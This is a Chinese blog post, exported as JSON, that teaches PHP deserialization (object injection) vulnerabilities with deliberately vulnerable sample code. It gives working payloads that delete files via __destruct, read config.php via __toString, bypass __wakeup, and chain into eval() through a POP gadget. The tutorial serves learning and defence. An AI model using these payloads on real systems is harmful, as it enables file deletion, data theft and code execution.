{"title":"php对象注入","slug":"php对象注入小结","date":"2017-11-10T02:55:43.000Z","updated":"2018-04-01T08:20:29.991Z","comments":true,"path":"api/articles/php对象注入小结.json","photos":[],"link":"","excerpt":"php对象注入又叫做反序列化漏洞，<br>同时对php的序列化与反序列化研究了好长时间，现在小结一下<br>","covers":["http://i.imgur.com/VbSO53D.png","http://i.imgur.com/EftYJbd.png"],"content":"<p>php对象注入又叫做反序列化漏洞，<br>同时对php的序列化与反序列化研究了好长时间，现在小结一下<br><a id=\"more\"></a></p>\n<h2 id=\"0x00-序列化与反序列化简介\"><a href=\"#0x00-序列化与反序列化简介\" class=\"headerlink\" title=\"0x00 序列化与反序列化简介\"></a>0x00 序列化与反序列化简介</h2><blockquote>\n<p>string serialize ( mixed $value )</p>\n</blockquote>\n<p>php序列化函数serialize()将对象或数组转变为字符串，包含了表示 value 的字节流，便于存储或传参。unserialize()则是将序列化好的字符串作输入，返回数组或对象。序列化的危害就在于如果序列化的内容是用户可控的，那么用户就可以注入精心构造的payload。当进行发序列化的时候就有可能会出发对象中的一些魔术方法，造成意想不到的危害。</p>\n<p>php不同类型变量序列化</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $v1 = <span class=\"number\">123</span>;</span><br><span class=\"line\">    $v2 = <span class=\"number\">1.23</span>;</span><br><span class=\"line\">    $v3 = <span class=\"string\">'123'</span>;</span><br><span class=\"line\">    $v4 = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    $v5 = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    $v6 = <span class=\"keyword\">array</span>(<span class=\"string\">'key'</span>=&gt;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b2</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $v = <span class=\"string\">'123'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $v7 = <span class=\"keyword\">new</span> b;</span><br><span class=\"line\">    $v8 = <span class=\"keyword\">new</span> b2;</span><br><span class=\"line\">    $i = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>($i &lt; <span class=\"number\">9</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> serialize($&#123;<span class=\"string\">'v'</span>.$i&#125;).<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">        $i ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i:123;               //整数类型:值;</span><br><span class=\"line\">d:1.23;              //双精度类型</span><br><span class=\"line\">s:3:&quot;123&quot;;           //字符串类型:字符串长度:字符串的值;</span><br><span class=\"line\">b:1;              //布尔类型，0或1</span><br><span class=\"line\">a:0:&#123;&#125;               //数组类型:元素个数:&#123;&#125;</span><br><span class=\"line\">a:3:&#123;s:3:&quot;key&quot;;i:1;i:0;i:2;i:1;i:3;&#125;</span><br><span class=\"line\">O:1:&quot;b&quot;:0:&#123;&#125;      //对象类型:类名长度:类名:属性个数:&#123;&#125;</span><br><span class=\"line\">O:2:&quot;b2&quot;:1:&#123;s:1:&quot;v&quot;;s:3:&quot;123&quot;;&#125;s表示字符串；长度为1/3，值为v/123</span><br></pre></td></tr></table></figure></p>\n<p>tips：序列化private变量和protected变量时，会出现两个不能显示的字节char(0)</p>\n<p>\\x00 + 类名 + \\x00 + 变量名 反序列化出来的是private变量, \\x00 + * + \\x00 + 变量名 反序列化出来的是protected变量, 而直接变量名反序列化出来的是public变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A &#123;</span><br><span class=\"line\">    private $a = &quot;a&quot;;</span><br><span class=\"line\">    protected $d = &quot;d&quot;;</span><br><span class=\"line\">    public $b = &quot;b&quot;;</span><br><span class=\"line\">    static $c = &quot;c&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = new A();</span><br><span class=\"line\">echo serialize($test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<p><img src=\"http://i.imgur.com/VbSO53D.png\" alt=\"\"></p>\n<p>这里的NUL就是char(0)</p>\n<p>详细的序列化格式请参阅<a href=\"http://www.neatstudio.com/show-161-1.shtml\" target=\"_blank\" rel=\"noopener\">http://www.neatstudio.com/show-161-1.shtml</a></p>\n<h3 id=\"反序列举例\"><a href=\"#反序列举例\" class=\"headerlink\" title=\"反序列举例\"></a>反序列举例</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $v1 = unserialize(&apos;s:3:&quot;123&quot;;&apos;);</span><br><span class=\"line\">    class b&#123;</span><br><span class=\"line\">        public $v;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $v2 = unserialize(&apos;O:1:&quot;b&quot;:1:&#123;s:1:&quot;v&quot;;s:3:&quot;123&quot;;&#125;&apos;);</span><br><span class=\"line\">    var_dump($v1);</span><br><span class=\"line\">    var_dump($v2);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(3) &quot;123&quot;</span><br><span class=\"line\">object(b)#1 (1) &#123;</span><br><span class=\"line\">  [&quot;v&quot;]=&gt;</span><br><span class=\"line\">  string(3) &quot;123&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"PHP类和对象\"><a href=\"#PHP类和对象\" class=\"headerlink\" title=\"PHP类和对象\"></a>PHP类和对象</h3><p>对类和对象，这里总结一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  public $var = &quot;Hello PHP&quot;;  //定义变量</span><br><span class=\"line\">  function display()&#123;  //定义方法</span><br><span class=\"line\">    echo $this-&gt;var;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = new Test; //创建实例</span><br><span class=\"line\">$b = $a-&gt;display(); //输出Hello PHP</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h4><p>php中包含了一些特殊的魔术方法（magic function），这些方法以__开头，常见的有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()，__invoke()， __set_state()， __clone() 和 __debugInfo()</span><br></pre></td></tr></table></figure>\n<p>下面举个栗子，介绍下主要的魔术方法的用法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  public $var = &apos;str1&apos;;</span><br><span class=\"line\">  public $var2 = &apos;str2&apos;;</span><br><span class=\"line\">  public function PrintVariable()</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo $this-&gt;var . &apos;&lt;br /&gt;&apos;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public function __construct() //创建对象时调用</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo &apos;1.__construct&lt;br /&gt;&apos;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public function __destruct()  //代码结束时调用</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo &apos;2.__destruct&lt;br /&gt;&apos;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public function __wakeup() //反序列化调用</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo &apos;3.__wakeup&lt;br /&gt;&apos;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public function __sleep() //序列化时调用</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo &apos;4.__sleep&lt;br /&gt;&apos;;</span><br><span class=\"line\">    return array(&apos;var&apos;, &apos;var2&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj = new Test();  //调用__construct</span><br><span class=\"line\">$s = serialize($obj);  //调用__sleep</span><br><span class=\"line\">print &apos;Serialized: &apos; . $s . &apos;&lt;br&gt;&apos;;  </span><br><span class=\"line\">$obj2 = unserialize($s); //调用__wakeup</span><br><span class=\"line\">$obj2-&gt;PrintVariable(); //调用__destruct</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>输出为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.__construct</span><br><span class=\"line\">4.__sleep</span><br><span class=\"line\">Serialized: O:4:&quot;Test&quot;:2:&#123;s:3:&quot;var&quot;;s:4:&quot;str1&quot;;s:4:&quot;var2&quot;;s:4:&quot;str2&quot;;&#125;</span><br><span class=\"line\">3.__wakeup</span><br><span class=\"line\">str1</span><br><span class=\"line\">2.__destruct</span><br><span class=\"line\">2.__destruct</span><br></pre></td></tr></table></figure></p>\n<p>关于更多魔术方法的介绍点<a href=\"http://php.net/manual/zh/language.oop5.magic.php\" target=\"_blank\" rel=\"noopener\">这</a></p>\n<h2 id=\"0x01-PHP对象注入\"><a href=\"#0x01-PHP对象注入\" class=\"headerlink\" title=\"0x01 PHP对象注入\"></a>0x01 PHP对象注入</h2><p>因为所有的php对象序列化都与应用执行流，可用的类以及魔术方法有关。所以有很多利用的地方：</p>\n<h3 id=\"1-destruct\"><a href=\"#1-destruct\" class=\"headerlink\" title=\"1.__destruct()\"></a>1.__destruct()</h3><p>例如下述代码：一个类临时将日志存储到了一个文件中。当该类的对象被销毁时，该对象不再需要这个日志文件，然后会删除该文件。\\</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.php:</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">class LogFile</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $filename;</span><br><span class=\"line\">    public function LogData($text)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;</span><br><span class=\"line\">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Destructor that deletes the log file</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;</span><br><span class=\"line\">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>简单应用：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2.php:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &apos;1.php&apos;;  //上面代码所在文件名</span><br><span class=\"line\">$obj = new LogFile();</span><br><span class=\"line\">// 设置日志文件名，并写入日志信息</span><br><span class=\"line\">$obj-&gt;filename = &apos;1.txt&apos;;</span><br><span class=\"line\">$obj-&gt;LogData(&apos;Test&apos;);</span><br><span class=\"line\">//程序结束，将调用析构器，文件&apos;1.txt&apos;也被删除</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>此时，我们可以找到一个允许用户提交的脚本来调用unserialize()函数达到恶意目的。<br>例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3.php:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &apos;logfile.php&apos;;</span><br><span class=\"line\">// ... 其他代码</span><br><span class=\"line\">// 定义类User</span><br><span class=\"line\">class User</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  // 类数据</span><br><span class=\"line\">  public $age = 0;</span><br><span class=\"line\">  public $name = &apos;&apos;;</span><br><span class=\"line\">  // 打印数据</span><br><span class=\"line\">  public function PrintData()</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 反序列化用户提供的数据</span><br><span class=\"line\">$usr = unserialize($_GET[&apos;a&apos;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>正常的请求应像这样</p>\n<p><code>3.php?a=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</code></p>\n<p>现在我们使用序列化的“LogFile”对象来制作请求：</p>\n<p><code>3.php?a=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:3:&quot;123&quot;;}</code><br>就会删除123文件，因为<code>__destruct</code>方法被自动调用，并且我们能够使用类“LogFile”的变量，所以我们能够将变量“filename”设置成任何值。</p>\n<h3 id=\"2-toString\"><a href=\"#2-toString\" class=\"headerlink\" title=\"2.__toString()\"></a>2.__toString()</h3><p>关于<code>__toString()</code>的用法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Person&#123;</span><br><span class=\"line\">    private $name;</span><br><span class=\"line\">    function __construct($name)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $this-&gt;name = $name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function say()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        echo &quot;Hello,&quot;.$this-&gt;name.&quot;!&lt;br/&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function __tostring()&#123;//在类中定义一个__toString方法</span><br><span class=\"line\">        return  &quot;Hello,&quot;.$this-&gt;name.&quot;!&lt;br/&gt;&quot;;    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$WBlog = new Person(&apos;WBlog&apos;);</span><br><span class=\"line\">echo $WBlog;//直接输出对象引用，自动调用了对象中的__toString()方法</span><br><span class=\"line\">$WBlog-&gt;say();//输出相同</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>漏洞代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class FileClass&#123;</span><br><span class=\"line\">  public $filename = &apos;error.log&apos;;</span><br><span class=\"line\">  // 将对象用作字符串来显示文件内容</span><br><span class=\"line\">  public function __toString()</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    return file_get_contents($this-&gt;filename);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj = unserialize($_GET[&apos;a&apos;]);</span><br><span class=\"line\">// 将调用反序列化对象的__toString方法</span><br><span class=\"line\">echo $obj;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>构造恶意代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.php?a=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>此时可以访问config.php的内容</p>\n<h3 id=\"3-再介绍一下-wakeup漏洞\"><a href=\"#3-再介绍一下-wakeup漏洞\" class=\"headerlink\" title=\"3.再介绍一下__wakeup漏洞\"></a>3.再介绍一下__wakeup漏洞</h3><p>前面讲过wakeup会在反序列化之后调用。<br>但是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行<br>实例代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class A&#123;</span><br><span class=\"line\">        function __wakeup()&#123;</span><br><span class=\"line\">        echo &apos;Hello&apos;;</span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">$c = new A();</span><br><span class=\"line\">$v=serialize($c);</span><br><span class=\"line\">$d=unserialize($v);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>测试代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Set3rnal&#123;  </span><br><span class=\"line\">var $a = array();</span><br><span class=\"line\">function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;PHP\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function __wakeup()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    echo &quot;hello\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$b = new Set3rnal(array(&apos;0&apos; =&gt; Set,&apos;1&apos; =&gt; Hello,&apos;2&apos; =&gt; World));</span><br><span class=\"line\">print (serialize($b));</span><br><span class=\"line\">//$c = unserialize(&quot;&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>此时输出为<code>O:8:&quot;Set3rnal&quot;:1:{s:1:&quot;a&quot;;a:0:{}}PHP</code></p>\n<p>将序列化的结果改为<code>O:8:&quot;Set3rnal&quot;:2:{s:1:&quot;a&quot;;a:0:{}}</code>反序列化赋予c<br>此时报错 并没有执行<code>__wakeup()</code>出现hello<br>这里有一个sugarcrm的实例 有兴趣看<a href=\"http://paper.seebug.org/39/\" target=\"_blank\" rel=\"noopener\">http://paper.seebug.org/39/</a> 我就不赘述了</p>\n<h2 id=\"0x02-反序列化之-pop链\"><a href=\"#0x02-反序列化之-pop链\" class=\"headerlink\" title=\"0x02 反序列化之 pop链\"></a>0x02 反序列化之 pop链</h2><p>代码除了含有实现魔术函数的类，可以进行恶意攻击外，还有就是开始一个“POP链”<br>大体了解一下pop链</p>\n<p>我们把魔术方法当作是最开始的gadgets，它们会调用其它的函数(gadgets)，我们通过寻找相同名字的函数，将类的属性和敏感函数的属性联系起来，即pop chain。所有的敏感属性我们都是可以控制的。</p>\n<p>所以如果漏洞代码不在魔术方法中，而是在一个普通的方法中，那么可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>\n<p>栗子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class set &#123;</span><br><span class=\"line\">        protected $a;</span><br><span class=\"line\"></span><br><span class=\"line\">        function __construct() &#123;</span><br><span class=\"line\">            $this-&gt;a = new normal();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function __destruct() &#123;</span><br><span class=\"line\">            $this-&gt;a-&gt;action();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class normal &#123;</span><br><span class=\"line\">        function action() &#123;</span><br><span class=\"line\">            echo &quot;hello&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class evil &#123;</span><br><span class=\"line\">        private $data;</span><br><span class=\"line\">        function action() &#123;</span><br><span class=\"line\">            eval($this-&gt;data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    unserialize($_GET[&apos;d&apos;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>可以看出Set类是想调用normal类的action方法，但是action方法同时存在于evil类中，此时就可以构造pop链，调用evil中的action方法</p>\n<p>Payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class set &#123;</span><br><span class=\"line\">    protected $a;</span><br><span class=\"line\">    function __construct() &#123;</span><br><span class=\"line\">        $this-&gt;a = new evil();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class evil &#123;</span><br><span class=\"line\">    private $data = &quot;phpinfo();&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo urlencode(serialize(new Set()));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">echo:</span><br><span class=\"line\"></span><br><span class=\"line\">O%3A3%3A%22set%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://i.imgur.com/EftYJbd.png\" alt=\"\"></p>\n","categories":[],"tags":[{"name":"Web","slug":"Web","count":1,"path":"api/tags/Web.json"}]}